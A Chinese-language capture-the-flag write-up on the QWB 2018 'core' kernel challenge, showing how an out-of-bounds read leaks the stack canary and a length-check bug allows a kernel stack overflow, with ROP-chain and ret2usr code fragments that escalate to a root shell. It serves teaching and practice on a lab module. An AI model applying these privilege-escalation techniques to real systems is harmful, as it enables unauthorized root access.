> 原文链接: https://www.anquanke.com//post/id/223356 


# linux-kernel-pwn-qwb2018-core


                                阅读量   
                                **96878**
                            
                        |
                        
                                                                                    



[![](https://p5.ssl.qhimg.com/t0142dfcc9c36bdfd7e.jpg)](https://p5.ssl.qhimg.com/t0142dfcc9c36bdfd7e.jpg)



作者：[平凡路上](https://mp.weixin.qq.com/s/_y5uFdmzIOXE_eSmx_D38A)

根据难易，先看简单的栈溢出。通过强网杯2018内核题core来了解如何利用基本的栈溢出来进行提权。

## 描述

下载[程序](https://github.com/ray-cp/linux_kernel_pwn/blob/master/qwb2018-core/give_to_player.zip)后，先看文件结构：

```
$ ll
total 118848
-rw-r--r--  1 raycp  staff   6.7M Mar 23  2018 bzImage
-rw-r--r--  1 raycp  staff    12M Mar 23  2018 core.cpio
-rwxr-xr-x  1 raycp  staff   221B Mar 23  2018 start.sh
-rwxr-xr-x  1 raycp  staff    39M Mar 24  2018 vmlinux
```

启动脚本的内容如下：

```
$ cat start.sh
qemu-system-x86_64 \
-m 64M \
-kernel ./bzImage \
-initrd  ./core.cpio \
-append "root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr" \
-s  \
-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \
-nographic  \
```

将`64`改成128，不然会一直重启。`-s`的意思是`shorthand for -gdb tcp::1234`，表示开启了`1234`端口用于调试；内核也开启了`kaslr`。

将`core.cpio`文件系统提取出来，目录如下：

```
$ ll
drwxrwxr-x 2 raycp raycp 4.0K Oct  8 03:15 bin
-rw-rw-r-- 1 raycp raycp 6.9K Mar 23  2018 core.ko
drwxrwxr-x 2 raycp raycp 4.0K Oct  8 03:15 etc
-rwxrwxr-x 1 raycp raycp   66 Mar 16  2018 gen_cpio.sh
-rwxrwxr-x 1 raycp raycp  558 Oct  9 20:34 init
drwxrwxr-x 3 raycp raycp 4.0K Oct  8 03:15 lib
drwxrwxr-x 2 raycp raycp 4.0K Oct  8 03:15 lib64
lrwxrwxrwx 1 raycp raycp   11 Oct  8 03:15 linuxrc -&gt; bin/busybox
drwxrwxr-x 2 raycp raycp 4.0K Mar 16  2018 proc
drwxrwxr-x 2 raycp raycp 4.0K Oct  8 03:15 root
drwxrwxr-x 2 raycp raycp 4.0K Oct  8 03:15 sbin
drwxrwxr-x 2 raycp raycp 4.0K Mar 16  2018 sys
drwxrwxr-x 2 raycp raycp 4.0K Mar 22  2018 tmp
drwxrwxr-x 4 raycp raycp 4.0K Oct  8 03:15 usr
-rwxrwxr-x 1 raycp raycp  46M Mar 23  2018 vmlinux
```

`init`内容如下：

```
#!/bin/sh
mount -t proc proc /proc
mount -t sysfs sysfs /sys
mount -t devtmpfs none /dev
/sbin/mdev -s
mkdir -p /dev/pts
mount -vt devpts -o gid=4,mode=620 none /dev/pts
chmod 666 /dev/ptmx
cat /proc/kallsyms &gt; /tmp/kallsyms
echo 1 &gt; /proc/sys/kernel/kptr_restrict
echo 1 &gt; /proc/sys/kernel/dmesg_restrict
ifconfig eth0 up
udhcpc -i eth0
ifconfig eth0 10.0.2.15 netmask 255.255.255.0
route add default gw 10.0.2.2
insmod /core.ko

poweroff -d 120 -f &amp;
setsid /bin/cttyhack setuidgid 1000 /bin/sh
echo 'sh end!\n'
umount /proc
umount /sys

poweroff -d 0  -f
```

由于存在`echo 1 &gt; /proc/sys/kernel/kptr_restrict`，导致无法在非root权限下查看`/proc/kallsyms`，但是它已经用`cat /proc/kallsyms &gt; /tmp/kallsyms`，也可以通过`/tmp/kallsyms`读到符号地址。

为方便调试，可将`poweroff -d 120 -f &amp;`这句注释掉以关闭自动关机；将`setsid /bin/cttyhack setuidgid 1000 /bin/sh`改为`setsid /bin/cttyhack setuidgid 0 /bin/sh`以获得root权限，从而方便获取信息。

根据`insmod /core.ko`大概知道了存在漏洞的模块为`core.ko`，是主要分析的目标。



## 分析

```
$ checksec core.ko
[*] '/home/raycp/work/kernel/qwb2018-core/cpio/core.ko'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x0)
```

程序开启了canary以及nx。

将`core.ko`拖进去IDA中，`init_module`函数：

```
__int64 init_module()
`{`
  core_proc = proc_create("core", 438LL, 0LL, &amp;core_fops);
  printk(&amp;unk_2DE);
  return 0LL;
`}`
```

调用`proc_create`创建一个`PROC entry`，可以通过对文件系统中的该文件交互，实现和内核进行数据的交互。

函数原型是如下，其`proc_fops`实现的交互函数。

```
static inline struct proc_dir_entry *proc_create(
    const char *name, umode_t mode, struct proc_dir_entry *parent,
    const struct file_operations *proc_fops)
`{`
    return proc_create_data(name, mode, parent, proc_fops, NULL);
`}`
```

可以看到`core_fops`中实现了`release`、`write`、`ioctl`函数，最主要的是`core_write`以及`core_ioctl`，下面对这两个函数进行分析。

`core_write`代码如下，当用户提供数据长度小于`0x800`时，将数据拷贝至全局变量`name`中。

```
signed __int64 __fastcall core_write(__int64 fd, void *buffer, unsigned __int64 len)
`{`
  printk(&amp;unk_215);
  if ( len &lt;= 0x800 &amp;&amp; !copy_from_user(name, buffer, len) )
    return (unsigned int)len;
  printk(&amp;unk_230);
  return 4294967282LL;
`}`
```

`core_ioctl`相关如下，当操作码为`0x6677889C`，可以设置全局变量`off`；操作码为`0x6677889B`时，会根据设置的`off`，从栈中`stack_buffer[off]`开始拷贝0x40给返回给用户；操作码为`0x6677889A`时，将全局变量`name`中数据拷贝长度`len`到栈中。

```
__int64 __fastcall core_ioctl(__int64 filp, int command, __int64 arg)
`{`
  switch ( command )
  `{`
    case 0x6677889B:
      core_read((void *)arg);
      break;
    case 0x6677889C:
      printk(&amp;unk_2CD);
      off = arg;
      break;
    case 0x6677889A:
      printk(&amp;unk_2B3);
      core_copy_func(arg);
      break;
  `}`
  return 0LL;
`}`

unsigned __int64 __fastcall core_read(void *buffer)
`{`
  char *ptr; // rdi
  signed __int64 i; // rcx
  unsigned __int64 result; // rax
  char stack_buffer[64]; // [rsp+0h] [rbp-50h]
  unsigned __int64 canary; // [rsp+40h] [rbp-10h]

  canary = __readgsqword(0x28u);
  printk(&amp;unk_25B);
  printk(&amp;unk_275);
  ptr = stack_buffer;
  for ( i = 16LL; i; --i )
  `{`
    *(_DWORD *)ptr = 0;
    ptr += 4;
  `}`
  strcpy(stack_buffer, "Welcome to the QWB CTF challenge.\n");
  result = copy_to_user(buffer, &amp;stack_buffer[off], 0x40LL);// we can leak here
  if ( !result )
    return __readgsqword(0x28u) ^ canary;
  __asm `{` swapgs `}`
  return result;
`}`

signed __int64 __fastcall core_copy_func(signed __int64 len)
`{`
  signed __int64 result; // rax
  char stack_buffer[64]; // [rsp+0h] [rbp-50h]
  unsigned __int64 v3; // [rsp+40h] [rbp-10h]

  v3 = __readgsqword(0x28u);
  printk(&amp;unk_215);
  if ( len &gt; 0x3F )
  `{`
    printk(&amp;unk_2A1);
    result = 0xFFFFFFFFLL;
  `}`
  else
  `{`
    result = 0LL;
    qmemcpy(stack_buffer, name, (unsigned __int16)len);
  `}`
  return result;
`}`
```

漏洞比较明显，首先是越界读写漏洞，栈大小只有0x40，而`off`可以随意设置，因此可以通过越界读实现canary等信息的泄露。栈溢出漏洞泽存在于`core_copy_func`函数中`qmemcpy`拷贝时只使用了最后面的2字节数据，而比对长度时使用的是8字节数据，可以构造负数绕过检查，实现栈溢出（如使用`0xffffffff00000000 | 0x0100`实现的是拷贝0x100字节）。



## 利用

比较简单的栈溢出漏洞，只是利用场景从用户空间移到了内核空间，需要实现提权的操作。有两种方式，一种是直接利用ROP链进行提权，一种是ret2usr进行提权。

### <a class="reference-link" name="ROP%E6%8F%90%E6%9D%83"></a>ROP提权

ROP提权包含三步：
1. 信息泄露获取canary。
1. 栈溢出ROP实现提权。
1. 返回用户空间并创建`root shell`。
首先是泄露canary，设置全局变量为`0x40`时，并调用`core_read`。拷贝至用户空间的第一个数据是`canary`。

Pop rdi ret; 0; prepare_kernel_cred commit_creds

有了canary后，就可以栈溢出执行ROP链了。ROP的主要功能是调用`commit_creds(prepare_kernel_cred(0))`，函数的地址可以在`/tmp/kallsyms`中可以看到。

需要找到`gadget`，由于`vmlinux`有46m，用`ROPgadget`耗时会很久，师傅们都推荐用的[ropper](https://github.com/sashs/Ropper)，效率较高。

```
ropper --file ./vmlinux --nocolor &gt; ropgadget.txt
```

然后在`ropgadget.txt`中寻找gadget，gadget中地址是没有随机化的地址，因此需要依靠偏移得到真实地址，偏移计算方法如下：

```
In [1]: from pwn import *

In [2]: e=ELF("./vmlinux")
[*] '/home/raycp/work/kernel/qwb2018-core/vmlinux'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      No PIE (0xffffffff81000000)
    RWX:      Has RWX segments

In [3]: hex(e.symbols['prepare_kernel_cred']-0xffffffff81000000)
Out[3]: '0x9cce0'
```

再从`/tmp/kallsyms`中读取`prepare_kernel_cred`地址，计算得到内核基址，加上gadget的偏移得到gadget地址。

最终构造出来的rop链如下：

```
*(ptr + i++) = prdi_ret;
    *(ptr + i++) = 0;
    *(ptr + i++) = prepare_kernel_cred;
    *(ptr + i++) = prcx_ret;
    *(ptr + i++) = commit_creds;
    *(ptr + i++) = mov_rdi_rax_jmp_rcx;
```

最后一步是返回用户空间并创建`root shell`。寻找包含`swapgs` 的gadget恢复 GS 值，再寻找一条包含`iretq`的gadget返回到用户空间。

`iret`指令的IA-32指令手册如下：

```
the IRET instruction pops the return instruction pointer, return code segment selector, and EFLAGS image from the stack to the EIP, CS, and EFLAGS registers, respectively, and then resumes execution of the interrupted program or procedure. If the return is to another privilege level, the IRET instruction also pops the stack pointer and SS from the stack, before resuming program execution.
```

在返回到用户空间是会依此从内核栈中弹出`rip`、`cs`、`EFLAGS`、`rsp`以及`ss`寄存器，因此需要也需要将这些数据部署正确，所以需要在开始覆盖之前保存相应的寄存器。保存数据的代码如下：

```
void save_status() `{`
    asm(
            "movq %%cs, %0\n\t"
            "movq %%ss, %1\n\t"
            "movq %%rsp, %2\n\t"
            "pushfq\n\t"
            "popq %3\n\t"
            : "=r" (user_cs), "=r" (user_ss), "=r" (user_sp), "=r" (user_rflags)
            :
            : "memory");

 `}`
```

最终构造出来的返回用户空间并创建root shell的rop链如下：

```
*(ptr + i++) = swapgs_p_ret;
    *(ptr + i++) = 0;
    *(ptr + i++) = iretq_ret;
    *(ptr + i++) = (uint64_t) root_shell;
    *(ptr + i++) = user_cs;
    *(ptr + i++) = user_rflags;
    *(ptr + i++) = user_sp;
    *(ptr + i++) = user_ss;
```

最终成功拿到root shell：

```
/ $ id
uid=1000(chal) gid=1000(chal) groups=1000(chal)
/ $ ./exp
commit creds addr: 0xffffffff8a69c8e0
prepare kernel cred addr: 0xffffffff8a69cce0
kernel base: 0xffffffff8a600000
leak canary: 0x40f4b6285353e500
get root shell...
/ # id
uid=0(root) gid=0(root)
```

### <a class="reference-link" name="ret2usr%E6%8F%90%E6%9D%83"></a>ret2usr提权

还有一种解法是ret2usr，利用的原理是内核没有开启smep时，内核空间可以访问用户空间数据以及执行用户空间的代码。因此可以不用rop去执行`commit_creds(prepare_kernel_cred(0))`；而是直接在用户空间调用`commit_creds(prepare_kernel_cred(0))`代码。

关键代码如下，将提权函数在用户空间实现，栈溢出劫持到控制流时直接执行用户空间提权代码`privilege_escalate`后，再返回到用户空间中创建root shell。

```
void privilege_escalate()
`{`
    char* (*pkc)(int) = prepare_kernel_cred;
    void (*cc)(char*) = commit_creds;
    (*cc)((*pkc)(0));

    return ;
`}`

...

        ptr = (uint64_t *)(buffer+0x40);
    *(ptr + i++) = canary;
    *(ptr + i++) = rbp;
    *(ptr + i++) = (uint64_t) privilege_escalate;
    *(ptr + i++) = swapgs_p_ret;
    *(ptr + i++) = 0;
    *(ptr + i++) = iretq_ret;
    *(ptr + i++) = (uint64_t) root_shell;
    *(ptr + i++) = user_cs;
    *(ptr + i++) = user_rflags;
    *(ptr + i++) = user_sp;
    *(ptr + i++) = user_ss;
```



## 小结

如果没有开始smep的话，在用户空间执行代码要比rop实现功能相对来说会简单一些。

内核栈溢出需要注意的是要返回到用户空间，且不能破坏数据，内核一崩溃整个系统就结束了。返回到用户空间的`iretq`指令弹出寄存器的顺序让我纠结了一段时间，最后还是看手册解决了问题，官方手册还是很关键。

相关文件以及脚本[链接](https://github.com/ray-cp/linux_kernel_pwn/tree/master/qwb2018-core)。



## 链接
1. [proc_create函数内幕初探](https://www.cnblogs.com/ck1020/p/7475729.html)
1. [kernel pwn（0）：入门&amp;ret2usr](https://www.anquanke.com/post/id/172216#h2-7)
1. [Kernel-ROP](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/kernel_rop-zh/)